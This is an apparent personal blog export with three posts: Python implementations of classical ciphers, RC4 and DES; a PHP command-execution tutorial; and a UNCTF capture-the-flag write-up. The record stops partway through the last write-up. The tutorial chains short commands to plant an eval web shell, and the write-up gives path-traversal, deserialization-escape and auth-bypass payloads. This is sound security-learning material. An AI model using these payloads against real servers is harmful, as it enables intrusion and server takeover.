[{"title":"密码学","date":"2020-12-23T08:37:43.000Z","path":"2020/12/23/密码学/","text":"密码学实验课程设计 一、古典密码仿射密码简介仿射加密在本质上还是一个置换密码：如果说移位密码是一个常数级别的置换，那么，仿射加密是一个一次级别的置换 加密原理假设X，Y，A，B是Z26整数环中的元素，A和B为密钥，X是原文，Y是密文 加密函数：Y=（AX+B）%26 解密函数：Y=（AX+B）%26，得到：X=（A的逆元）*（Y-B）%26 原理很简单，代码实现也比较简单 代码实现各个函数作用 gcd(a,b) 求a,b的最大公因子 findModReverse(a,m) 计算a模m的逆元 encode(a,b,s) 仿射加密 decode(a,b,s) 仿射解密 利用扩展的欧几里得算法求逆元 def gcd(a,b): # 求出最大公因数 while a!=0: a,b = b%a,a return b def findModReverse(a,m): #扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m 完整代码如下 def gcd(a,b): # 求出最大公因数 while a!=0: a,b = b%a,a return b def findModReverse(a,m): #扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m def encode(a,b,s): result = \"\" # 保存加密结果 s = s.upper() # 全部转换为大写，方便计算 for i in range(0,len(s)): s2 = chr((a*(ord(s[i])-65)+b)%26 + 65) #使用加密公式 Y=（AX+B）%26 result = result +s2 print(result.lower()) def decode(a,b,s): a1 = findModReverse(a,26) result = \"\" s = s.upper() for i in range(0, len(s)): s2 = chr((a1 * (ord(s[i]) - 65 - b)) % 26 + 65) # 使用解密公式X=（A的逆元）*（Y-B）%26 result = result + s2 print(result.lower()) def s_decode(a,b,s): letter ='abcdefghijklmnopqrstuvwxyz' letter = letter.upper() s = s.upper() result = \"\" for i in s: for j in range(0,len(letter)): if i == letter[(a*j+b)%26]: result = result+letter[j] print(result.lower()) def main(): # 主函数入口 answer = input(f'请输入所需的操作：编码/E or 解码/D: ') try: if answer.upper() == 'E': a = int(input('请输入a:')) b = int(input('请输入b:')) s = input('请输入需要加密的字符:') encode(a, b, s) elif answer.upper() == 'D': a = int(input('请输入a:')) b = int(input('请输入b:')) s = input('请输入需要解密的字符：') decode(a, b, s) # 利用逆元解密 # s_decode(a,b,s) # 暴力枚举每一个字符 else: print('输入错误！') except KeyError: print('请勿输入空格！') if __name__ == '__main__': main() # a = 7, b = 22 # plain = firstthesentenceandthentheevidencesaidthequeen # crypto = falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj 加解密结果如图所示 破解仿射密码这里使用了加解密中的 gcd findModReverse，找出26以内且与26互素的所有数的逆元，并存放在一个列表中 def findAllre(): # 找出所有小于26且与26互素的数 re_all = [] for i in range(1,26): if gcd(i,26) == 1: res = findModReverse(i,26) re_all.append(res) #re_all.sort() return re_all 完整代码如下 def gcd(a,b): # 求出最大公因数 while a!=0: a,b = b%a,a return b def findModReverse(a,m): #扩展欧几里得算法求模逆 if gcd(a,m)!=1: return None u1,u2,u3 = 1,0,a v1,v2,v3 = 0,1,m while v3!=0: q = u3//v3 v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3 return u1%m def findAllre(): # 找出所有小于26且与26互素的数 re_all = [] for i in range(1,26): if gcd(i,26) == 1: res = findModReverse(i,26) re_all.append(res) #re_all.sort() return re_all def decode(s): re_all = findAllre() for k1 in re_all: for k2 in range(0, 26): result = \"\" for i in range(len(s)): s2 = chr(((int(k1) * (ord(s[i]) - 97 - k2)) % 26 + 97)) result = result + s2 print(\"k1=\" + str(findModReverse(k1,26)) + \", k2=\" + str(k2) + \" plaintext = \" + result) def main(): # criphertext = 'falszztysyjzyjkywjrztyjztyynaryjkyswarztyegyyj' criphertext = input(\"请输入要破解的密文: \") criphertext = criphertext.lower() print(\"---------\"*3+\"strat attck\"+\"---------\"*3) decode(criphertext) if __name__ == '__main__': main() 效果如下 维吉尼亚密码1.简介维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。 维吉尼亚密码曾多次被发明。该方法最早记录在吉奥万·巴蒂斯塔·贝拉索（ Giovan Battista Bellaso）于1553年所著的书《吉奥万·巴蒂斯塔·贝拉索先生的密码》（意大利语：La cifra del. Sig. Giovan Battista Bellaso）中。然而，后来在19世纪时被误传为是法国外交官布莱斯·德·维吉尼亚（Blaise De Vigenère）所创造，因此现在被称为“维吉尼亚密码”。 维吉尼亚密码以其简单易用而著称，同时初学者通常难以破解，因而又被称为“不可破译的密码”。这也让很多人使用维吉尼亚密码来加密的目的就是为了将其破解。 2.加解密原理 加解密代码 # 将密钥处理成和密文/明文一样长 def solve_key(s,key): nkey = key while len(nkey) &lt; len(s): nkey = nkey+key nkey = nkey[:len(s)] return nkey # 加密函数 def encode(s,key): print('加密后的结果： ',end='') s1 = s.upper() key1 = solve_key(s, key) key1 = key1.upper() result = \"\" for i in range(0,len(s)): s2 = chr(abs(((ord(s1[i])-65)+(ord(key1[i])-65)) % 26) + 65) result = result + s2 print(result.lower()) # 解密函数 def decode(s,key): print('解密后的结果： ', end='') s1 = s.upper() key1 = solve_key(s, key) key1 = key1.upper() result = \"\" for i in range(0, len(s)): s2 = chr(((ord(s1[i]) - 65) - (ord(key1[i]) - 65)) % 26 + 65) result = result + s2 print(result.lower()) def main(): while 1: # 函数入口 answer = input(f'请输入所需的操作：编码/E or 解码/D: ') try: if answer.upper() == 'E': key = input('请输入密钥: ') key = \"\".join(filter(str.isalpha, key)) s = input('请输入明文: ') s = \"\".join(filter(str.isalpha, s)) # 将字符串中的非字母字符去掉 # print(s) encode(s, key) elif answer.upper() == 'D': key = input('请输入密钥: ') key = \"\".join(filter(str.isalpha, key)) s = input('请输入密文: ') s = \"\".join(filter(str.isalpha, s)) decode(s, key) else: print('输入错误！') except KeyError: print('请检查输入是否正确！') if __name__ == '__main__': main() 二、序列密码LFSR代码实现 def lsrf(inti, top): sum = 0 inti2 = \"0\"*len(inti) inti2 = list(inti2) inti1 = '' for i in range(len(inti)): if top[i] == \"1\": sum += int(inti[i]) sum = sum % 2 for i in range(len(inti)): if i == 0: inti2[i] = str(sum) else: inti2[i] = inti[i - 1] inti1 = inti1.join(inti2) return inti1 def main(): inti_str = str(input(\"请输入初始化序列：\")) inti_str = inti_str[::-1] inti_str_backup = inti_str top = str(input(\"请输入本原多项式：\")) top = top[::-1] for i in range(2 ** len(inti_str) + 1): if inti_str_backup == inti_str and i != 0 and i == 2 ** len(inti_str) - 1: print(\"第&#123;0&#125;次\".format(i), inti_str_backup) print(\"是本原多项式且周期是\" + str(i)) break elif inti_str_backup == inti_str and i != 0 and i != 2 ** len(inti_str) - 1: print(\"第&#123;0&#125;次\".format(i), inti_str_backup) print(\"不是本原多项式且周期是\" + str(i)) break print(\"第&#123;0&#125;次\".format(i), inti_str_backup) inti_str_backup = lsrf(inti_str_backup, top) if __name__ == '__main__': main() 选择本原多项式和初始序列如下 100000000001000000 011100010100100101 程序运行结果 RC4完整代码 import hashlib import base64 # S盒初始化置换,Key为密钥 def Rc4_init(S, Key): j = 0 Key = Key.encode('UTF-8') Key = hashlib.md5(Key).hexdigest() # 长度为32的字符串 tmp = [] for i in range(256): S.append(i) tmp.append(Key[i % len(Key)]) for i in range(256): j = (j + S[i] + ord(tmp[i])) % 256 S[i], S[j] = S[j], S[i] # 交换S[i],S[j] def rc4_Encode(S, plaintext): i = j = 0 result = '' for a in plaintext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(ord(a) ^ S[(S[i] + S[j]) % 256]) result += k result = base64.b64encode(result.encode('UTF-8')) result = result.decode() return result def rc4_Decode(S, criphtext): i = j = 0 criphtext = base64.b64decode(criphtext) criphtext = str(criphtext.decode()) result = '' for a in criphtext: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] t = (S[i] + S[j]) % 256 k = chr(ord(a) ^ S[t]) result += k return result def main(): while 1: order = input(\"请输入指令,加密/E,解密/D :\") if order.upper() =='E': plaintext = input('请输入明文: ') key = input(\"请输入密钥: \") s = [] Rc4_init(s, key) cryphtext = rc4_Encode(s, plaintext) print(\"密文为: \", cryphtext) print('\\n') else: cryphtext = input(\"请输入密文: \") key = input(\"请输入密钥: \") s = [] Rc4_init(s, key) plaintext = rc4_Decode(s, cryphtext) print(\"明文为: \", plaintext) print('\\n') if __name__ == '__main__': main() 三、DESDEC_ECB模式 # 两字符进行异或运算 def xor(str1, str2): res = \"\" for i in range(0, len(str1)): xor_res = int(str1[i], 10)^int(str2[i], 10) if xor_res == 1: res += '1' else: res += '0' return res # 处理字符串，将每个字符串都转成八位二进制数 def str_process(str): res = \"\" for i in str: tmp = bin(ord(i))[2:] tmp = (8 - len(tmp)) * '0' + tmp # 不够八位则在前面补 0 res += tmp return res # PC-1盒处理 def key_change_1(str): change_table = [57,49,41,33,25,17,9,1, 58,50,42,34,26,18,10, 2,59,51,43,35,27,19,11, 3,60,52,44,36,63,55,47, 39,31,23,15,7,62,54,46, 38,30,22,14,6,61,53,45, 37,29,21,13,5,28,20,12,4] res = \"\" for i in change_table: res += str[i-1] return res # PC-2盒处理 def key_change_2(str): change_table = [14,17,11,24,1,5,3,28, 15,6,21,10,23,19,12,4, 26,8,16,7,27,20,13,2, 41,52,31,37,47,55,30,40, 51,45,33,48,44,49,39,56, 34,53,46,42,50,36,29,32] res = \"\" for i in change_table: res += str[i-1] return res # 循环左移 def left_run(str, num): tmp_str = str[num:len(str)] tmp_str = tmp_str+str[0:num] return tmp_str # 生成16个子密钥 def key_gen(str): key_list = [] key_change_res = key_change_1(str) key_c = key_change_res[0:28] key_d = key_change_res[28:] num = [0, 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1] for i in range(1, 17): #共16轮 key_c = left_run(key_c, num[i]) key_d = left_run(key_d, num[i]) key_yiwei = key_c + key_d key_res = key_change_2(key_yiwei) key_list.append(key_res) return key_list # IP盒处理 def begin_change(str): change_table = [58,50,42,34,26,18,10,2, 60,52,44,36,28,20,12,4, 62,54,46,38,30,22,14,6, 64,56,48,40,32,24,16,8, 57,49,41,33,25,17,9,1, 59,51,43,35,27,19,11,3, 61,53,45,37,29,21,13,5, 63,55,47,39,31,23,15,7] res = \"\" for i in change_table: res += str[i-1] return res # E盒处理 32位-&gt;48位 def E_box(str): change_table = [32,1,2,3,4,5,4,5, 6,7,8,9,8,9,10,11, 12,13,12,13,14,15,16,17, 16,17,18,19,20,21,20,21, 22,23,24,25,24,25,26,27, 28,29,28,29,30,31,32,1] res = \"\" for i in change_table: res += str[i-1] return res # s盒处理 48位-&gt;32位 def S_box(str): j = 0 s_list = [[14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13], [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9], [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12], [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14], [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3], [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13], [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12], [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11] ] res = \"\" for i in range(0, len(str), 6): begin_s = str[i:i + 6] row = int(begin_s[0] + begin_s[5], 2) #第一位和第六位作为行 col = int(begin_s[1:5], 2) #中间四位作为列 index = s_list[j][row * 16 + col] num = bin(index)[2:] #将匹配的数字转换位二进制数 for k in range(0, 4 - len(num)): #不够4位则补0 num = \"0\" + num res += num j = j + 1 return res # p盒处理 置换操作 def P_box(str): res = \"\" change_table = [16,7,20,21,29,12,28,17, 1,15,23,26,5,18,31,10, 2,8,24,14,32,27,3,9, 19,13,30,6,22,11,4,25] for i in change_table: res += str[i - 1] return res # F函数 def F_function(str, key): # R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或-&gt;S盒-&gt;P置换 str_e_res = E_box(str) # 将 E 异或 S P 集合到一个函数种，便于调用 xor_res = xor(str_e_res, key) str_s_res = S_box(xor_res) str_p_res = P_box(str_s_res) return str_p_res # 逆IP盒 def IP_re(str): res = \"\" ip_list = [40,8,48,16,56,24,64,32, 39,7,47,15,55,23,63,31, 38,6,46,14,54,22,62,30, 37,5,45,13,53,21,61,29, 36,4,44,12,52,20,60,28, 35,3,43,11,51,19,59,27, 34,2,42,10,50,18,58,26, 33,1,41,9,49,17,57,25 ] for i in ip_list: res += str[i-1] return res # DES加密操作 def DESencode(text, key): text_bin = str_process(text) # 将字符转换为二进制数 text_IP = begin_change(text_bin) # 明文初始置换 key_bin = str_process(key) # 将密钥转换位二进制数 key_list = key_gen(key_bin) # key_lsst 数组中存放着十六个子密钥 text_left = text_IP[0:32] # R0 text_right = text_IP[32:] # L0 for i in range(0, 15): # 十五轮加密 mes_tmp = text_right # 临时变量用于左右两部分交换 text_right = xor(F_function(text_right, key_list[i]) , text_left) #F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位) text_left = mes_tmp fin_right = text_right # 第十六轮加密 fin_left = xor(F_function(text_right, key_list[15]), text_left) criph_text = fin_left + fin_right criph_text = IP_re(criph_text) # IP逆置换 return criph_text # 针对一组的解密程序 def DESdecode(text, key): #密文直接输64位2进制 key_bin = str_process(key) # 将密钥转换为二进制数 key_list = key_gen(key_bin) # 生成的十六个子密钥 text = begin_change(text) # 先初始值换 与加密过程相反 cipher_left = text[0:32] # R16 cipher_right = text[32:] # L16 i = 15 while i &gt; 0: # 十五轮加密 反过来 cipher_tmp = cipher_right #设置一个临时变量用于后面的交换 cipher_right = xor(cipher_left, F_function(cipher_right, key_list[i])) # F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位) # F 函数处理完后与L(32位)异或 cipher_left = cipher_tmp # 左右交换完成 i = i - 1 left_text = xor(cipher_left, F_function(cipher_right, key_list[0])) # 一 right_text = cipher_right # 二 三 这三步是第十六轮加密 plain_bin = left_text + right_text # plain_bin = IP_re(plain_bin) # plain_text = \"\" for i in range(0, len(plain_bin), 8): plain_text += chr(int(plain_bin[i:i + 8], 2)) return plain_text def Divide_text(order,text,key): # 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组 block_text = [] res = \"\" length = 0 if order == \"E\": length = 8 else: length = 64 i = 0 while text[i:i+length] != \"\": block_text.append(text[i:i+length]) i += length if order == 'E': if len(block_text[-1]) != 8: # 最后一组明文如果不够八个字符则添加 + 补齐八个 否则程序会报错 block_text[-1] = block_text[-1] + '+' * (8 - len(block_text[-1])) for text in block_text: # 分别对每组加密 res += DESencode(text, key) else: for text in block_text: # 对密文解密 res += DESdecode(text, key) return res def main(): while 1: plaintext = '' ciphertext = '' key = '' order = input(\"加密请按E,解密请按D:\") if order == 'E': plaintext = input(\"请输入明文：\") key = input(\"请输入密钥：\") ciphertext = Divide_text(order, plaintext, key) print(\"密文是：\") print(ciphertext) else: ciphertext = input(\"请输入密文：\") key = input(\"请输入密钥：\") plaintext = Divide_text(order, ciphertext, key) print(\"明文是：\") print(plaintext) if __name__ == '__main__': main() DES_CBC模式 只需要修改ECB模式中的 Divide_text 部分 def Divide_text(order,text,key): # 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组 block_text = [] IV = 'aaaaaaaa' # 初始化向量 IV_bin = str_process(IV) res = \"\" length = 0 if order == \"E\": length = 8 else: length = 64 i = 0 while text[i:i+length] != \"\": block_text.append(text[i:i+length]) i += length tmp = \"\" # 加密 if order == 'E': if len(block_text[-1]) != 8: # 最后一组明文如果不够八个字符则添加 + 补齐八个 否则程序会报错 block_text[-1] = block_text[-1] + '+' * (8 - len(block_text[-1])) for i in range(len(block_text)): # 分别对每组加密 if i == 0 : tmp = DESencode(block_text[i],key, IV_bin) res += tmp else: tmp = DESencode(block_text[i],key,tmp) res += tmp # 解密 else: for i in range(len(block_text)): if i == 0: tmp = block_text[i] res += DESdecode(block_text[i], key, IV_bin) else: res += DESdecode(block_text[i], key, tmp) tmp = block_text[i] return res 四、RSA五、MD5六、综合实验","tags":[{"name":"古典密码","slug":"古典密码","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"},{"name":"DES","slug":"DES","permalink":"https://sunzhengyu99.github.io/tags/DES/"},{"name":"RSA","slug":"RSA","permalink":"https://sunzhengyu99.github.io/tags/RSA/"},{"name":"MD5","slug":"MD5","permalink":"https://sunzhengyu99.github.io/tags/MD5/"}]},{"title":"rce","date":"2020-11-29T08:32:39.000Z","path":"2020/11/29/rcm/","text":"看到一个关于任意命令执行的视频后感觉很有意思，可以记录以下，以后可能会用到。 php中存在命令执行的常见函数1.system$last_line = system('ls', $return_var); system() 会将输出内容直接印出, 所以若于网页, 会将所有回传内容都显示于页面上. $last_line: 只能取得最后一行的内容 $return_var: 取得系统状态回传码 2.shell_exec$output = shell_exec('ls'); $output: 回传内容都会存于此变数中(储存成纯文字内容), 不会直接秀在页面上. 3.execexec('ls', $output, $return_var); $output: 回传内容都会存于此变数中(储存成阵列), 不会直接秀在页面上. $return_var: 取得系统状态回传码 3.evaleval执行命令的原理与上面几个不同，eval 会把字符串作为PHP代码执行 例如 eval(\"phpinfo();\"); eval(\"system('dir');\"); eval(\"echo 'hello!';\"); //注意：因为是将字符串当作php代码执行，所以相当于双引号中的代码再次执行了一次，所以里面的代码一定要符合php语法规则 4.create_functionphp官方手册 用法如下 $a = 'system'; $b = 'dir'; $c = 'assert'; $d = 'phpinfo()'; call_user_func($a,$b); call_user_func($c,$d); 5.call_user_func$a = create_function('$code','echo $code;'); $b = 'hello'; $a($b); $a = 'phpinfo();'; $b = create_function('',$a); $b(); //和下面两个定义的函数作用相同 function a($b)&#123; echo '$b'; &#125; function b()&#123; phpinfo(); &#125; 限制字符长度的命令执行实验环境为ubuntu nginx+php5.5 实验目的 通过命令执行想服务器写入一句话木马而达到控制服务器的目的 &lt;?php highlight_file(__FILE__); if(strlen($_GET[1])&lt;=15)&#123; echo strlen($_GET[1]); echo shell_exec($_GET[1]); &#125; else&#123; exit(\"It's too long!\"); &#125; ?&gt; 限制了参数1的字符长度为15 然后将传递的参数放到shell_exec中执行 突破点就是利用shell_exec函数将，我们的一句话木马写入到一个php文件中，获取shell。 所以想要够的payload的为 ?1&#x3D;echo shellcode &gt;1.php 将一句话木马写入到1.php中，我们知道一句话木马最短字符长度应该为21 ，这显然不能达到14个字符的限制要求 可以使用echo text &gt;&gt;tmp.txt 将字符串输出追加重定向，当前目录存在tmp.txt，则将tmp.txt的内容后面追加输出的字符串，会换行 例如下面 字符限制解决了，那么得知道换行后php代码还能正常执行吗，本地验证发现是没问题的 下面就可以做这个题目了 //为了每次写入更多的字符可以利用无后缀名的文件，最后用mv将其改为php文件 ?1=echo \\&lt;\\?php &gt;1 ?1=echo eval\\( &gt;&gt;1 ?1=echo \\$_GET &gt;&gt;1 ?1=echo \\[1\\] &gt;&gt;1 ?1=echo \\)\\; &gt;&gt;1 ?1=mv 1 1.php 之后访问1.php提交参数，获取想要的内容。","tags":[{"name":"cmd","slug":"cmd","permalink":"https://sunzhengyu99.github.io/tags/cmd/"}]},{"title":"UNCTF","date":"2020-11-17T15:13:00.000Z","path":"2020/11/17/UNCTF/","text":"比赛和考试时间有点冲突，也没有好好做题，只好结束复现一下。 easy_ssrf&lt;?php echo'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'; highlight_file(__FILE__); $url = $_GET['url']; if(preg_match('/unctf\\.com/',$url))&#123; if(!preg_match('/php|file|zip|bzip|zlib|base|data/i',$url))&#123; $url=file_get_contents($url); echo($url); &#125;else&#123; echo('error!!'); &#125; &#125;else&#123; echo(\"error\"); &#125; ?&gt; 看下代码发现过滤了大部分协议名，一开始一直以为是使用特殊编码绕过结果行不通 后来才知道考点根本不绕过。 payload： ?file=unctf.com/../../../../../flag //不唯一 ?file=():unctf.com/../../../../flag //()里可以填任意字符除了正则过滤的几个协议 原理：当php遇到一个不认识的protocol时，会抛出一个warning，并将protocol设置为null,在protoco为null或file时，则进行本地操作。默认情况下不传协议或传入了不存在协议，会进行本地文件操作。 easyunserialize考察点是反序列化字符逃逸 先冲简单的PHP反序列化字符逃逸了解什么是反序化逃逸。 &lt;?php function filter($str)&#123; return str_replace('bb', 'ccc', $str); &#125; class A&#123; public $name='aaaa'; public $pass='123456'; &#125; $AA=new A(); $res=filter(serialize($AA)); $c=unserialize($res); echo $c-&gt;pass; ?&gt; 利用反序列化逃逸修改pass的值。 正常的序列化结果 O:1:\"A\":2:&#123;s:4:\"name\";s:4:\"aaaa\";s:4:\"pass\";s:6:\"123456\";&#125; s:4:&quot;aaaa&quot;s后面的数字表示变量的长度，php执行的时候会根据其长度读取数据，如果不符合规则则会反序列化失败。 例如 O:1:\"A\":2:&#123;s:4:\"name\";s:5:\"aaaa\";s:4:\"pass\";s:6:\"123456\";&#125; 将4改为5，那么则认为name的值为 aaaa&quot;,此时因为前面的”无法闭合而导致反序列化失败。 而上面的程序中存在一个替换函数，只要name中存在bb则将其替换为ccc，导致name字段的长度会增加1，我们将逃逸的字符串的长度填充成我们要反序列化的代码的话那就可以控制反序列化的结果以及类里面的变量值了。那么就可以利用这个函数来构造出想要的序列化字符串。 例如想将pass变量的序列化字符串如下 \";s:4:\"pass\";s:6:\"hacker\";&#125; 其中 前面的 “;是为了闭合的变量的”，保证语法正确，}的作用是序列化字符串结束的标志 上面的字符串长度为27，所以就需要27个bb来产生27个字符长度的逃逸 &lt;?php function filter($str)&#123; return str_replace('bb', 'ccc', $str); &#125; class A&#123; public $name='bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:6:\"hacker\";&#125;'; public $pass='123456'; &#125; $AA=new A(); var_dump(serialize($AA)); $res=filter(serialize($AA)); var_dump($res); $c=unserialize($res); echo $c-&gt;pass; //echo unserialize($AA); //\";s:4:\"pass\";s:6:\"hacker\";&#125; ?&gt; //结果如下 ||为对齐 /* string(136) \"O:1:\"A\":2:&#123;s:4:\"name\";s:81:\"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:4:\"pass\";s:6:\"hacker\";&#125;\";s:4:\"pass\";s:6:\"123456\";&#125;\"|| string(163) \"O:1:\"A\":2:&#123;s:4:\"name\";s:81:\"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc\";s:4:\"pass\";s:6:\"hacker\";&#125;\"||;s:4:\"pass\";s:6:\"123456\";&#125;\" hacker */ 这里pass的值就被该称了hacker 总结：逃逸或者说被“顶”出来的payload就会被当做当前类的属性被执行。 参考 &lt;?php error_reporting(0); highlight_file(__FILE__); class a &#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password==='easy') &#123; include('flag.php'); echo $flag; &#125; else &#123; echo 'wrong password'; &#125; &#125; &#125; function filter($string)&#123; return str_replace('challenge','easychallenge',$string); &#125; $uname=$_GET[1]; $password=1; $ser=filter(serialize(new a($uname,$password))); $test=unserialize($ser); ?&gt; 这段代码的意思大致为，get方式提交一个1，之后生成一个序列化字符串并将字符串中的challenge换成easychallenge，字符长度增加4，当密码为easy时，得到flag。这题看上去与上面的例子差不多，但是构造的时候发现并不是 需要构造的属性 \";s:4:\"password\";s:4:\"easy\";&#125; 可以发现上面的字符串长度为29，而每替换一个challenge只能逃逸出4个字符，不能构造出29，因此这里需要再构造出一个属性，使上面的字符串的长度为4的倍数。 \";s:8:\"password\";s:4:\"easy\";s:4:\"aaaa\";s:1:\"a\";&#125; 上面构造出的payload长度为48因此还需要12个challenge。 &lt;?php class a &#123; public $uname='challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge\";s:8:\"password\";s:4:\"easy\";s:4:\"aaaa\";s:1:\"a\";&#125;'; public $password=\"1\"; &#125; function filter($string)&#123; return str_replace('challenge','easychallenge',$string); &#125; $ser=filter(serialize(new a($uname,$password))); echo($ser); ?&gt; O:1:\"a\":2:&#123;s:5:\"uname\";s:156:\"easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge\";s:8:\"password\";s:4:\"easy\";s:4:\"aaaa\";s:1:\"a\";&#125;\";s:8:\"password\";s:1:\"1\";&#125; //easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge 长度为156 finalpayload： challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge\";s:8:\"password\";s:4:\"easy\";s:4:\"aaaa\";s:1:\"a\";&#125; easyphp给了提示 /source查看源码 &lt;?php $adminPassword = 'd8b8caf4df69a81f2815pbcb74cd73ab'; if (!function_exists('fuxkSQL')) &#123; function fuxkSQL($iText) &#123; $oText = $iText; $oText = str_replace('\\\\\\\\', '\\\\', $oText); $oText = str_replace('\\\"', '\"', $oText); $oText = str_replace(\"\\'\", \"'\", $oText); $oText = str_replace(\"'\", \"''\", $oText); return $oText; &#125; &#125; if (!function_exists('getVars')) &#123; function getVars() &#123; $totals = array_merge($_GET, $_POST); if (count($_GET)) &#123; foreach ($_GET as $key =&gt; $value) &#123; global $&#123;$key&#125;; if (is_array($value)) &#123; $temp_array = array(); foreach ($value as $key2 =&gt; $value2) &#123; if (function_exists('mysql_real_escape_string')) &#123; $temp_array[$key2] = fuxkSQL(trim($value2)); &#125; else &#123; $temp_array[$key2] = str_replace('\"', '\\\"', str_replace(\"'\", \"\\'\", (trim($value2)))); &#125; &#125; $&#123;$key&#125; = $_GET[$key] = $temp_array; &#125; else &#123; if (function_exists('mysql_real_escape_string')) &#123; $&#123;$key&#125; = fuxkSQL(trim($value)); &#125; else &#123; $&#123;$key&#125; = $_GET[$key] = str_replace('\"', '\\\"', str_replace(\"'\", \"\\'\", (trim($value)))); &#125; &#125; &#125; &#125; &#125; &#125; getVars(); if (isset($source)) &#123; highlight_file(__FILE__); &#125; //只有admin才能设置环境变量 if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123; echo 'you can set config variables!!' . '&lt;/br&gt;'; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match('/var\\d&#123;1,2&#125;/', $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123; @eval(\"\\$$key\" . '=\"' . $GLOBALS[$key] . '\";'); &#125; &#125; &#125; else &#123; foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match('/var\\d&#123;1,2&#125;/', $key)) &#123; echo ($GLOBALS[$key]) . '&lt;/br&gt;'; &#125; &#125; &#125; 代码很长，但是很容易理解 fuxkSQL是将可能存在sql注入的符号转义 getvarh是将传的参数赋值 global ${$key};这里存在两个$$，所以可能存在变量覆盖 if (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) $password的md5值与adminPassword,这里可以利用变量覆盖绕过 password=111&amp;adminPassword=md(111) sha1($verif)==$verif弱类型比较，也很容易绕过 sha1($a)=0exxx 只要找出0e开头的字符串的sha1值为0e开头 &lt;?php for ($i5 = 0; $i5 &lt;= 9999999999; $i5++) &#123; $res = '0e' . $i5; //0e1290633704 if ($res == hash('sha1', $res)) &#123; print_r($res); &#125; &#125; 所以verif=0e1290633704 重点在这 foreach (array_keys($GLOBALS) as $key) &#123; if (preg_match('/var\\d&#123;1,2&#125;/', $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; 12) &#123; @eval(\"\\$$key\" . '=\"' . $GLOBALS[$key] . '\";'); 